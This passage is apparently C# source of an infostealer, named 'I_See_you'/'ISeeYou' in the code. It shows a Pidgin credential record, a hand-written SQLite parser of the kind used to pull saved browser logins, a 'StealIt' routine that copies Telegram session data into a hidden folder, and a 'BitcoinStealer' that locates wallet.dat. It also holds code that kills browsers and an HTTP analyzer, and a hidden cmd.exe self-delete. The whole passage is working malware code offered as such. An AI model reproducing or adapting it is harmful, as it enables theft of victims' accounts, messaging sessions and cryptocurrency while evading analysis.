            return pidgin;
        }
    }
    class PassDataPidgin
    {
        public string Protocolname { get; private set; }
        public string Login { get; private set; }
        public string Password { get; private set; }
        public PassDataPidgin(string protocol, string login, string password)
        {
            Protocolname = protocol;
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return
                string.Format(
                    "Program : {0}\r\nProtocol : {1}\r\nLogin : {2}\r\nPassword : {3}\r\n——————————————————————————————————",
                    new object[]
                    {
                        "Pidgin",
                        Protocolname,
                        Login,
                        Password,
                    });
        }
    }
}
namespace I_See_you
{
    class Sqlite
    {
        public Sqlite(string fileName)
        {
            _fileBytes = File.ReadAllBytes(fileName);
            _pageSize = ConvertToULong(16, 2);
            _dbEncoding = ConvertToULong(56, 4);
            ReadMasterTable(100L);
        }
        public string GetValue(int rowNum, int field)
        {
            string result;
            try
            {
                if (rowNum >= _tableEntries.Length)
                {
                    result = null;
                }
                else
                {
                    result = ((field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field]);
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }
        public int GetRowCount()
        {
            return _tableEntries.Length;
        }
        private bool ReadTableFromOffset(ulong offset)
        {
            bool result;
            try
            {
                if (_fileBytes[(int)(checked((IntPtr)offset))] == 13)
                {
                    ushort num = (ushort)(ConvertToULong((int)offset + 3, 2) - 1uL);
                    int num2 = 0;
                    if (_tableEntries != null)
                    {
                        num2 = _tableEntries.Length;
                        Array.Resize<Sqlite.TableEntry>(ref _tableEntries, _tableEntries.Length + (int)num + 1);
                    }
                    else
                    {
                        _tableEntries = new Sqlite.TableEntry[(int)(num + 1)];
                    }
                    for (ushort num3 = 0; num3 <= num; num3 += 1)
                    {
                        ulong num4 = ConvertToULong((int)offset + 8 + (int)(num3 * 2), 2);
                        if (offset != 100uL)
                        {
                            num4 += offset;
                        }
                        int num5 = Gvl((int)num4);
                        Cvl((int)num4, num5);
                        int num6 = Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL));
                        Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL), num6);
                        num4 += (ulong)((long)num6 - (long)num4 + 1L);
                        num5 = Gvl((int)num4);
                        num6 = num5;
                        long num7 = Cvl((int)num4, num5);
                        Sqlite.RecordHeaderField[] array = null;
                        long num8 = (long)(num4 - (ulong)((long)num5) + 1uL);
                        int num9 = 0;
                        while (num8 < num7)
                        {
                            Array.Resize<Sqlite.RecordHeaderField>(ref array, num9 + 1);
                            num5 = num6 + 1;
                            num6 = Gvl(num5);
                            array[num9].Type = Cvl(num5, num6);
                            if (array[num9].Type > 9L)
                            {
                                if (Sqlite.IsOdd(array[num9].Type))
                                {
                                    array[num9].Size = (array[num9].Type - 13L) / 2L;
                                }
                                else
                                {
                                    array[num9].Size = (array[num9].Type - 12L) / 2L;
                                }
                            }
                            else
                            {
                                array[num9].Size = (long)((ulong)_sqlDataTypeSize[(int)(checked((IntPtr)array[num9].Type))]);
                            }
                            num8 = num8 + (long)(num6 - num5) + 1L;
                            num9++;
                        }
                        if (array != null)
                        {
                            _tableEntries[num2 + (int)num3].Content = new string[array.Length];
                            int num10 = 0;
                            for (int i = 0; i <= array.Length - 1; i++)
                            {
                                if (array[i].Type > 9L)
                                {
                                    if (!Sqlite.IsOdd(array[i].Type))
                                    {
                                        if (_dbEncoding == 1uL)
                                        {
                                            _tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
                                        }
                                        else if (_dbEncoding == 2uL)
                                        {
                                            _tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
                                        }
                                        else if (_dbEncoding == 3uL)
                                        {
                                            _tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
                                        }
                                    }
                                    else
                                    {
                                        _tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size);
                                    }
                                }
                                else
                                {
                                    _tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(ConvertToULong((int)(num4 + (ulong)num7 + (ulong)((long)num10)), (int)array[i].Size));
                                }
                                num10 += (int)array[i].Size;
                            }
                        }
                    }
                }
                else if (_fileBytes[(int)(checked((IntPtr)offset))] == 5)
                {
                    ushort num11 = (ushort)(ConvertToULong((int)(offset + 3uL), 2) - 1uL);
                    for (ushort num12 = 0; num12 <= num11; num12 += 1)
                    {
                        ushort num13 = (ushort)ConvertToULong((int)offset + 12 + (int)(num12 * 2), 2);
                        ReadTableFromOffset((ConvertToULong((int)(offset + (ulong)num13), 4) - 1uL) * _pageSize);
                    }
                    ReadTableFromOffset((ConvertToULong((int)(offset + 8uL), 4) - 1uL) * _pageSize);
                }
                result = true;
            }
            catch
            {
                result = false;
            }
            return result;
        }
        private void ReadMasterTable(long offset)
        {
            try
            {
                byte b = _fileBytes[(int)(checked((IntPtr)offset))];
                if (b != 5)
                {
                    if (b == 13)
                    {
                        ulong num = ConvertToULong((int)offset + 3, 2) - 1uL;
                        int num2 = 0;
                        if (_masterTableEntries != null)
                        {
                            num2 = _masterTableEntries.Length;
                            Array.Resize<Sqlite.SqliteMasterEntry>(ref _masterTableEntries, _masterTableEntries.Length + (int)num + 1);
                        }
                        else
                        {
                            _masterTableEntries = new Sqlite.SqliteMasterEntry[num + 1uL];
                        }
                        for (ulong num3 = 0uL; num3 <= num; num3 += 1uL)
                        {
                            ulong num4 = ConvertToULong((int)offset + 8 + (int)num3 * 2, 2);
                            if (offset != 100L)
                            {
                                num4 += (ulong)offset;
                            }
                            int num5 = Gvl((int)num4);
                            Cvl((int)num4, num5);
                            int num6 = Gvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL));
                            Cvl((int)(num4 + (ulong)((long)num5 - (long)num4) + 1uL), num6);
                            num4 += (ulong)((long)num6 - (long)num4 + 1L);
                            num5 = Gvl((int)num4);
                            num6 = num5;
                            long num7 = Cvl((int)num4, num5);
                            long[] array = new long[5];
                            for (int i = 0; i <= 4; i++)
                            {
                                num5 = num6 + 1;
                                num6 = Gvl(num5);
                                array[i] = Cvl(num5, num6);
                                if (array[i] > 9L)
                                {
                                    if (Sqlite.IsOdd(array[i]))
                                    {
                                        array[i] = (array[i] - 13L) / 2L;
                                    }
                                    else
                                    {
                                        array[i] = (array[i] - 12L) / 2L;
                                    }
                                }
                                else
                                {
                                    array[i] = (long)((ulong)_sqlDataTypeSize[(int)(checked((IntPtr)array[i]))]);
                                }
                            }
                            if (_dbEncoding != 1uL && _dbEncoding != 2uL)
                            {
                                ulong arg_19A_0 = _dbEncoding;
                            }
                            if (_dbEncoding == 1uL)
                            {
                                _masterTableEntries[num2 + (int)num3].ItemName = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
                            }
                            else if (_dbEncoding == 2uL)
                            {
                                _masterTableEntries[num2 + (int)num3].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
                            }
                            else if (_dbEncoding == 3uL)
                            {
                                _masterTableEntries[num2 + (int)num3].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0]), (int)array[1]);
                            }
                            _masterTableEntries[num2 + (int)num3].RootNum = (long)ConvertToULong((int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
                            if (_dbEncoding == 1uL)
                            {
                                _masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                            }
                            else if (_dbEncoding == 2uL)
                            {
                                _masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                            }
                            else if (_dbEncoding == 3uL)
                            {
                                _masterTableEntries[num2 + (int)num3].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num4 + (ulong)num7 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                            }
                        }
                    }
                }
                else
                {
                    ushort num8 = (ushort)(ConvertToULong((int)offset + 3, 2) - 1uL);
                    for (int j = 0; j <= (int)num8; j++)
                    {
                        ushort num9 = (ushort)ConvertToULong((int)offset + 12 + j * 2, 2);
                        if (offset == 100L)
                        {
                            ReadMasterTable((long)((ConvertToULong((int)num9, 4) - 1uL) * _pageSize));
                        }
                        else
                        {
                            ReadMasterTable((long)((ConvertToULong((int)(offset + (long)((ulong)num9)), 4) - 1uL) * _pageSize));
                        }
                    }
                    ReadMasterTable((long)((ConvertToULong((int)offset + 8, 4) - 1uL) * _pageSize));
                }
            }
            catch
            {
            }
        }
        public bool ReadTable(string tableName)
        {
            bool result;
            try
            {
                int num = -1;
                for (int i = 0; i <= _masterTableEntries.Length; i++)
                {
                    if (string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                    {
                        num = i;
                        break;
                    }
                }
                if (num == -1)
                {
                    result = false;
                }
                else
                {
                    string[] array = _masterTableEntries[num].SqlStatement.Substring(_masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(new char[]
                    {
                        ','
                    });
                    for (int j = 0; j <= array.Length - 1; j++)
                    {
                        array[j] = array[j].TrimStart(new char[0]);
                        int num2 = array[j].IndexOf(' ');
                        if (num2 > 0)
                        {
                            array[j] = array[j].Substring(0, num2);
                        }
                        if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
                        {
                            Array.Resize<string>(ref _fieldNames, j + 1);
                            _fieldNames[j] = array[j];
                        }
                    }
                    result = ReadTableFromOffset((ulong)((_masterTableEntries[num].RootNum - 1L) * (long)_pageSize));
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }
        private ulong ConvertToULong(int startIndex, int size)
        {
            ulong result;
            try
            {
                if (size > 8 | size == 0)
                {
                    result = 0uL;
                }
                else
                {
                    ulong num = 0uL;
                    for (int i = 0; i <= size - 1; i++)
                    {
                        num = (num << 8 | (ulong)_fileBytes[startIndex + i]);
                    }
                    result = num;
                }
            }
            catch
            {
                result = 0uL;
            }
            return result;
        }
        private int Gvl(int startIdx)
        {
            int result;
            try
            {
                if (startIdx > _fileBytes.Length)
                {
                    result = 0;
                }
                else
                {
                    for (int i = startIdx; i <= startIdx + 8; i++)
                    {
                        if (i > _fileBytes.Length - 1)
                        {
                            result = 0;
                            return result;
                        }
                        if ((_fileBytes[i] & 128) != 128)
                        {
                            result = i;
                            return result;
                        }
                    }
                    result = startIdx + 8;
                }
            }
            catch
            {
                result = 0;
            }
            return result;
        }
        private long Cvl(int startIdx, int endIdx)
        {
            long result;
            try
            {
                endIdx++;
                byte[] array = new byte[8];
                int num = endIdx - startIdx;
                bool flag = false;
                if (num == 0 | num > 9)
                {
                    result = 0L;
                }
                else if (num == 1)
                {
                    array[0] = (byte)(_fileBytes[startIdx] & 127);
                    result = BitConverter.ToInt64(array, 0);
                }
                else
                {
                    if (num == 9)
                    {
                        flag = true;
                    }
                    int num2 = 1;
                    int num3 = 7;
                    int num4 = 0;
                    if (flag)
                    {
                        array[0] = _fileBytes[endIdx - 1];
                        endIdx--;
                        num4 = 1;
                    }
                    for (int i = endIdx - 1; i >= startIdx; i += -1)
                    {
                        if (i - 1 >= startIdx)
                        {
                            array[num4] = (byte)((_fileBytes[i] >> num2 - 1 & 255 >> num2) | (int)_fileBytes[i - 1] << num3);
                            num2++;
                            num4++;
                            num3--;
                        }
                        else if (!flag)
                        {
                            array[num4] = (byte)(_fileBytes[i] >> num2 - 1 & 255 >> num2);
                        }
                    }
                    result = BitConverter.ToInt64(array, 0);
                }
            }
            catch
            {
                result = 0L;
            }
            return result;
        }
        private static bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }
        private readonly ulong _dbEncoding;
        private readonly byte[] _fileBytes;
        private readonly ulong _pageSize;
        private readonly byte[] _sqlDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

        private string[] _fieldNames;
        private Sqlite.SqliteMasterEntry[] _masterTableEntries;
        private Sqlite.TableEntry[] _tableEntries;
        private struct RecordHeaderField
        {
            public long Size;
            public long Type;
        }
        private struct TableEntry
        {
            public string[] Content;
        }
        private struct SqliteMasterEntry
        {
            public string ItemName;
            public long RootNum;
            public string SqlStatement;
        }
    }
}
namespace I_See_you
{
    class Telegram
    {
        private static bool in_folder = false;
        public static void StealIt(string path)
        {
            var prcName = "Telegram";
            Process[] processByName = Process.GetProcessesByName(prcName);

            if (processByName.Length < 1)
                return;

            var dir_from = Path.GetDirectoryName(processByName[0].MainModule.FileName) + "\\Tdata";
            var dir_to = path + "\\Telegram_" +
                        (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
            CopyAll(dir_from, dir_to);
        }
        private static void CopyAll(string fromDir, string toDir)
        {
            DirectoryInfo di = Directory.CreateDirectory(toDir);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            foreach (string s1 in Directory.GetFiles(fromDir))
                CopyFile(s1, toDir);

            foreach (string s in Directory.GetDirectories(fromDir))
                CopyDir(s, toDir);
        }
        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);

                if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;

                var s2 = toDir + "\\" + fname;

                File.Copy(s1, s2);
            }
            catch { }
        }

        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_folder = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_folder = false;
            }
            catch { }
        }
    }
}
namespace I_See_you
{
    class Wallet
    {
        public static string BitcoinStealer()
        {
            string result;
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                {
                    result = registryKey.GetValue("strDataDir") + "wallet.dat";
                }
            }
            catch
            {
                result = "";
            }
            return result;
        }
    }
}
namespace ISeeYou
{
    class BlockBrowsers
    {
        private static string[] _ListPROcess = new string[]
    {
        "Opera",
        "YandexBrowser",
        "GoogleChrome",
        "Amigo",
        "Orbitum",
        "Torch",
        "Comodo",
        "HttpAnalyzerStdV7"
    };

        public static void KillProcess()
        {
            foreach (string Pro in _ListPROcess)
            {
                try
                {
                    foreach (Process pro in Process.GetProcessesByName(Pro))
                    {
                        pro.Kill();
                    }
                }
                catch (Exception) { }
            }
        }
    }
}
namespace ISeeYou
{
    class SelfDelete
    {
        public static void Delete()
        {
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " +
                           Assembly.GetExecutingAssembly().Location;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
            Process.GetCurrentProcess().Kill();
        }
    }
}
namespace ISeeYou
{
    static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            bool createdNew;
            new Mutex(true, "[mutex]", out createdNew);
            if (!createdNew)
            {
                SelfDelete.Delete();
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
